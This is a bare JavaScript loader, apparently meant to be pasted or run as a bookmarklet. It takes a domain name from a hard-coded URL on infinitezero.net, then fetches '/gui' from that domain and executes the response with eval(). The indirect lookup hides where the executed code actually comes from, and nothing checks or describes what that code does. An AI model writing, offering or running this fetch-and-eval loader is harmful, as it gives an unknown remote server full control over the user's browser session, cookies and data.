(async () => {
	eval(await (await fetch(await (await fetch("https://infinitezero.net/domain", {mode : "no-cors"})).text() + "/gui")).text());
})();